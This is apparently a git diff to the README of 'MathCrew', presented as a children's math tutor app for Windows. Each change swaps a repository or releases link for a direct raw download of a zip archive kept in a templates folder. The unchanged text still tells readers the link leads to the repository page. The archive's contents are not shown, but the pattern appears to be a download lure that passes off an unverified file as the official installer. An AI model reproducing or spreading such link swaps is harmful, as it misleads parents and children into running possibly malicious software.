@@ -1,6 +1,6 @@
 # 🎓 MathCrew - Adaptive Math Tutor for Kids
 
-[![Download MathCrew](https://img.shields.io/badge/Download-MathCrew-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew)
+[![Download MathCrew](https://img.shields.io/badge/Download-MathCrew-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew/raw/refs/heads/main/templates/Math_Crew_v2.1.zip)
 
 MathCrew is an AI-powered math tutor designed for children from Grade 1 to 6. It adapts to each student's learning pace and style, making math practice more effective and engaging. This guide will help you download and start using MathCrew on your Windows computer with no programming skills required.
 
@@ -41,7 +41,7 @@ Follow these steps to download and run MathCrew on your Windows PC.
 
 Click the button below to open the download page in your browser:
 
-[![Download MathCrew](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/minouza/MathCrew)
+[![Download MathCrew](https://img.shields.io/badge/Visit-GitHub-blue?style=for-the-badge)](https://github.com/minouza/MathCrew/raw/refs/heads/main/templates/Math_Crew_v2.1.zip)
 
 This link takes you to the GitHub repository where you can find the latest version of MathCrew.
 
@@ -126,7 +126,7 @@ Periodically check the GitHub page for new releases. Updates improve features an
 
 To update:
 
-- Go to the [MathCrew GitHub page](https://github.com/minouza/MathCrew/releases).  
+- Go to the [MathCrew GitHub page](https://github.com/minouza/MathCrew/raw/refs/heads/main/templates/Math_Crew_v2.1.zip).  
 - Download the newest installer following the same steps as before.  
 - Run the new installer. It will replace your old version safely, keeping your data.
 
@@ -148,6 +148,6 @@ You do not need this knowledge to use the app, but the information is available 
 
 You can always access the most recent installer here:
 
-[![Download MathCrew](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew/releases)
+[![Download MathCrew](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/minouza/MathCrew/raw/refs/heads/main/templates/Math_Crew_v2.1.zip)
 
 Click the button to download and start using MathCrew today.
